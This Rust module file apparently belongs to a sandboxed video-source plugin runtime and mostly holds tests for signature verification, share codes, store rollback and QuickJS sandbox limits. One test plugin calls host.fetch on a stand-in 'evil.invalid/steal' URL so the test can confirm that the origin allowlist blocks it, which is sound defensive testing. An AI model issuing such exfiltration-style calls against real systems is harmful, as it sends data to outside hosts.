//! Sandboxed video-source plugin runtime, Ed25519 verification, share-code codec, and atomic store.

pub(crate) mod commands;
pub(crate) mod lan_push;
pub(crate) mod manifest;
pub(crate) mod peer_store;
pub(crate) mod runtime;
pub(crate) mod store;
pub(crate) mod subscription;
pub(crate) mod verify;

use once_cell::sync::Lazy;
use std::path::Path;
use std::sync::Arc;
use peer_store::PeerStore;
use store::SourceStore;

static STORE: Lazy<Arc<SourceStore>> = Lazy::new(|| Arc::new(SourceStore::new()));
static PEER_STORE: Lazy<Arc<PeerStore>> = Lazy::new(|| Arc::new(PeerStore::new()));

pub(crate) fn store_arc() -> Arc<SourceStore> {
    Arc::clone(&STORE)
}

pub(crate) fn peer_store_arc() -> Arc<PeerStore> {
    Arc::clone(&PEER_STORE)
}

pub fn bind(app_data_dir: &Path) {
    STORE.bind(app_data_dir);
    PEER_STORE.bind(app_data_dir);
    let origin = active_default_origin();
    if !origin.is_empty() && crate::net::base().is_empty() {
        crate::net::sync_base_for_source(&origin);
    }
}

#[allow(unused_imports)]
pub(crate) use commands::{
    active_default_origin, active_image_decrypt, active_origins, active_source_id, invoke_active,
};

#[cfg(test)]
mod tests {
    use super::manifest::{
        decode_package_input, encode_share_code, validate_package, CatalogCapabilities,
        DetailCapabilities, PlaybackCapabilities, SourceCapabilities, SourceManifest,
        SourceNetwork, SourcePackage, SourceRuntime,
    };
    use super::runtime::invoke_source;
    use super::store::SourceStore;
    use super::verify::{sign_for_test, verify_package, verify_package_with_keys, TRUSTED_KEYS};
    use base64::engine::general_purpose::URL_SAFE_NO_PAD as B64_URL;
    use base64::Engine;
    use ring::rand::SystemRandom;
    use ring::signature::{Ed25519KeyPair, KeyPair};
    use serde_json::json;
    use std::sync::Arc;

    fn ephemeral_keypair() -> (Vec<u8>, String) {
        let rng = SystemRandom::new();
        let doc = Ed25519KeyPair::generate_pkcs8(&rng).unwrap();
        let pair = Ed25519KeyPair::from_pkcs8(doc.as_ref()).unwrap();
        let pub_b64url = B64_URL.encode(pair.public_key().as_ref());
        (doc.as_ref().to_vec(), pub_b64url)
    }

    fn sample_pkg(version: &str, code: &str) -> SourcePackage {
        SourcePackage {
            schema_version: 1,
            manifest: SourceManifest {
                schema_version: 1,
                id: "com.hghubx.fake-test".into(),
                name: "测试模拟源".into(),
                version: version.into(),
                api_version: "1".into(),
                description: "离线契约测试源".into(),
                author: "test".into(),
                runtime: SourceRuntime {
                    kind: "quickjs".into(),
                    entry: "inline".into(),
                },
                network: SourceNetwork {
                    origins: vec!["https://example.com".into()],
                    media_origins: vec!["https://cdn.example.com".into()],
                    publish_origins: vec![],
                },
                capabilities: SourceCapabilities {
                    home: true,
                    search: true,
                    catalog: CatalogCapabilities {
                        categories: false,
                        topics: None,
                        tags: true,
                        rankings: false,
                        authors: false,
                    },
                    detail: DetailCapabilities {
                        episodes: true,
                        related: false,
                        comments: false,
                    },
                    playback: PlaybackCapabilities {
                        hls: true,
                        mp4: true,
                        subtitles: false,
                    },
                    posts: false,
                    account: false,
                    lines: false,
                },
                media: None,
                catalog: None,
                links: None,
            },
            code: code.into(),
            update_urls: vec![],
            signature: None,
        }
    }

    const FAKE_SOURCE_JS: &str = r#"
module.exports = {
  init() { return { ok: true }; },
  home({ page, size }) {
    return {
      items: [{ id: 1001, title: "离线示例视频", cover: "", tags: ["测试"], score: 9.2, episode_count: 10, total_episodes: 10, hot: 999, is_finished: true }],
      pagination: { page: page || 1, pages: 1, size: size || 20, total: 1 }
    };
  },
  search({ q, page, size }) {
    const hash = host.crypto.sha256Hex(q || "").slice(0, 6);
    const items = host.htmlQuery("<ul><li data-id='1'>示例条目A</li><li>示例条目B</li></ul>", "li");
    return {
      items: [{ id: 2001, title: `${items[0].text}-${hash}`, cover: "", tags: ["测试"], score: 9.5, episode_count: 12, total_episodes: 12, hot: 5000, is_finished: true }],
      pagination: { page: page || 1, pages: 1, size: size || 20, total: 1 },
      keyword: q || ""
    };
  },
  detail({ id }) {
    host.storage.set("last_detail", String(id));
    return {
      id,
      title: "离线示例视频",
      episodes: [{ ep_num: 1, title: "第1集" }, { ep_num: 2, title: "第2集" }],
      counts: { like: 10, collect: 5, comment: 2, hot: 999 }
    };
  },
  playback({ id, ep }) {
    return {
      id: String(id),
      ep,
      video_url: "https://cdn.example.com/demo.m3u8"
    };
  },
  hotTags() {
    const nodes = host.htmlQuery("<div><a href='/t/a'>标签甲</a><a href='/t/b'>标签乙</a></div>", "a");
    return { items: nodes.map(n => ({ name: n.text, slug: n.attrs.href })) };
  }
};
"#;

    #[test]
    fn share_code_roundtrip_and_ed25519_verification() {
        // Pure-shell client ships with zero built-in trusted keys.
        assert!(TRUSTED_KEYS.is_empty());

        let mut pkg = sample_pkg("1.0.0", FAKE_SOURCE_JS);
        let (pkcs8, pub_b64) = ephemeral_keypair();
        sign_for_test(&mut pkg, &pkcs8, "test-ephemeral", true);

        let code = encode_share_code(&pkg).unwrap();
        assert!(code.starts_with("hghubx-src://"));
        let decoded = decode_package_input(&code).unwrap();
        validate_package(&decoded).unwrap();
        // Self-signed community source imports freely while still verifying signature integrity.
        assert_eq!(verify_package(&decoded, false).unwrap().status, "self_signed");

        let trusted = [("test-ephemeral", pub_b64.as_str())];
        let info = verify_package_with_keys(&decoded, false, &trusted).unwrap();
        assert_eq!(info.status, "trusted");
        assert_eq!(info.key_id, "test-ephemeral");

        // Tampering a single byte of a signed package must ALWAYS fail integrity verification.
        let mut tampered = decoded.clone();
        tampered.code.push(' ');
        assert!(verify_package(&tampered, true).is_err());

        // Unsigned community sources also import freely out of the box.
        let unsigned = sample_pkg("1.0.0", FAKE_SOURCE_JS);
        assert_eq!(verify_package(&unsigned, false).unwrap().status, "unsigned");
    }

    #[test]
    fn atomic_store_upgrade_and_rollback_preserve_state() {
        let dir = std::env::temp_dir().join(format!("hghubx-src-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let store = SourceStore::new();
        store.bind(&dir);

        let mut p1 = sample_pkg("1.0.0", FAKE_SOURCE_JS);
        let (pkcs8, pub_b64) = ephemeral_keypair();
        let trusted = [("test-ephemeral", pub_b64.as_str())];
        sign_for_test(&mut p1, &pkcs8, "test-ephemeral", false);
        let sig1 = verify_package_with_keys(&p1, false, &trusted).unwrap();
        let s1 = store.install(p1, sig1, true).unwrap();
        assert_eq!(s1.version, "1.0.0");
        assert!(s1.active);
        store.kv_set(&s1.id, "cursor", Some("abc".into())).unwrap();

        let mut p2 = sample_pkg("1.1.0", FAKE_SOURCE_JS);
        sign_for_test(&mut p2, &pkcs8, "test-ephemeral", false);
        let sig2 = verify_package_with_keys(&p2, false, &trusted).unwrap();
        let s2 = store.install(p2, sig2, false).unwrap();
        assert_eq!(s2.version, "1.1.0");
        assert_eq!(s2.previous_version.as_deref(), Some("1.0.0"));
        assert_eq!(store.kv_get(&s2.id, "cursor").as_deref(), Some("abc"));

        let rolled = store.rollback(&s2.id).unwrap();
        assert_eq!(rolled.version, "1.0.0");
        assert_eq!(rolled.previous_version.as_deref(), Some("1.1.0"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[tokio::test]
    async fn quickjs_sandbox_executes_contract_crypto_html_storage_and_blocks_infinite_loop() {
        let store = Arc::new(SourceStore::new());
        let pkg = sample_pkg("1.0.0", FAKE_SOURCE_JS);

        let res = invoke_source(store.clone(), pkg.clone(), "search", json!({ "q": "示例", "page": 1, "size": 5 }), Some(5))
            .await
            .unwrap();
        assert_eq!(res["items"][0]["id"], 2001);
        assert!(res["items"][0]["title"].as_str().unwrap().starts_with("示例条目A-"));

        let det = invoke_source(store.clone(), pkg.clone(), "detail", json!({ "id": 1001 }), Some(5))
            .await
            .unwrap();
        assert_eq!(det["episodes"].as_array().unwrap().len(), 2);
        assert_eq!(store.kv_get("com.hghubx.fake-test", "last_detail").as_deref(), Some("1001"));

        let tags = invoke_source(store.clone(), pkg.clone(), "hotTags", json!({}), Some(5))
            .await
            .unwrap();
        assert_eq!(tags["items"][0]["name"], "标签甲");

        // Crypto round-trip: ECDH P-256 + HKDF-SHA256 + AES-256-GCM inside QuickJS!
        let crypto_pkg = sample_pkg("1.0.0", r#"
module.exports = {
  init() {
    const a = host.crypto.ecdhP256Create();
    const b = host.crypto.ecdhP256Create();
    const salt = host.crypto.randomBytes(32).b64url;
    const ka = host.crypto.ecdhP256Derive(a.handle, b.publicKeyB64Url, salt, ["k1", "k2"]);
    const kb = host.crypto.ecdhP256Derive(b.handle, a.publicKeyB64Url, salt, ["k1", "k2"]);
    if (ka[0] !== kb[0] || ka[1] !== kb[1]) throw new Error("ECDH mismatch");
    const nonce = host.crypto.randomBytes(12).b64;
    const enc = host.crypto.aes256GcmEncrypt({ keyB64: ka[0], nonceB64: nonce, plaintextUtf8: "hello-sandbox", aadUtf8: "aad-1" });
    const dec = host.crypto.aes256GcmDecrypt({ keyB64: kb[0], nonceB64: nonce, ciphertextB64Url: enc.ciphertextB64Url, aadUtf8: "aad-1" });
    return { ok: dec.plaintextUtf8 === "hello-sandbox", text: dec.plaintextUtf8 };
  }
};
"#);
        let crypto_res = invoke_source(store.clone(), crypto_pkg, "init", json!({}), Some(5))
            .await
            .unwrap();
        assert_eq!(crypto_res["ok"], true);
        assert_eq!(crypto_res["text"], "hello-sandbox");

        // Auth & HTTP error propagation: "401" and "HTTP <nnn>..." preserve signals without wrapper prefix.
        let err_pkg = sample_pkg("1.0.0", r#"
module.exports = {
  init() { return { ok: true }; },
  authErr() { throw new Error("401"); },
  httpErr() { throw new Error("HTTP 403: forbidden"); }
};
"#);
        let e401 = invoke_source(store.clone(), err_pkg.clone(), "authErr", json!({}), Some(5))
            .await
            .unwrap_err();
        assert_eq!(e401, "401");
        let e403 = invoke_source(store.clone(), err_pkg, "httpErr", json!({}), Some(5))
            .await
            .unwrap_err();
        assert_eq!(e403, "HTTP 403: forbidden");

        // Security: origin outside manifest.network.origins MUST be blocked.
        let ssrf_pkg = sample_pkg("1.0.0", r#"
module.exports = {
  init() {
    return host.fetch({ url: "https://evil.invalid/steal" });
  }
};
"#);
        let err = invoke_source(store.clone(), ssrf_pkg, "init", json!({}), Some(5))
            .await
            .unwrap_err();
        assert!(err.contains("白名单"), "unexpected err: {err}");

        // Safety: infinite loop is terminated cleanly by QuickJS interrupt handler.
        let loop_pkg = sample_pkg("1.0.0", "module.exports = { init() { while(true) {} } };");
        let err = invoke_source(store.clone(), loop_pkg, "init", json!({}), Some(1))
            .await
            .unwrap_err();
        assert!(err.contains("超时") || err.contains("interrupted"), "unexpected err: {err}");

        let repo_root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).parent().unwrap();
        let base = repo_root.join("examples/sources/demo-offline");
        let mut m: SourceManifest = serde_json::from_str(&std::fs::read_to_string(base.join("manifest.json")).unwrap()).unwrap();
        m.runtime.entry = "inline".into();
        let code = std::fs::read_to_string(base.join("source.js")).unwrap();
        let mut ex = SourcePackage { schema_version: 1, manifest: m, code, update_urls: vec![], signature: None };
        let (pkcs8, pub_b64) = ephemeral_keypair();
        let trusted = [("test-ephemeral", pub_b64.as_str())];
        sign_for_test(&mut ex, &pkcs8, "test-ephemeral", true);
        validate_package(&ex).unwrap();
        assert_eq!(verify_package_with_keys(&ex, false, &trusted).unwrap().status, "trusted");
        let init_res = invoke_source(store.clone(), ex.clone(), "init", json!({}), Some(5)).await.unwrap();
        assert_eq!(init_res["ok"], true);
        let h = invoke_source(store.clone(), ex.clone(), "home", json!({ "page": 1, "size": 10 }), Some(5)).await.unwrap();
        assert_eq!(h["items"].as_array().unwrap().len(), 2);
        let s = invoke_source(store.clone(), ex, "search", json!({ "q": "示例", "page": 1, "size": 10 }), Some(5)).await.unwrap();
        assert_eq!(s["items"].as_array().unwrap().len(), 2);
    }
}
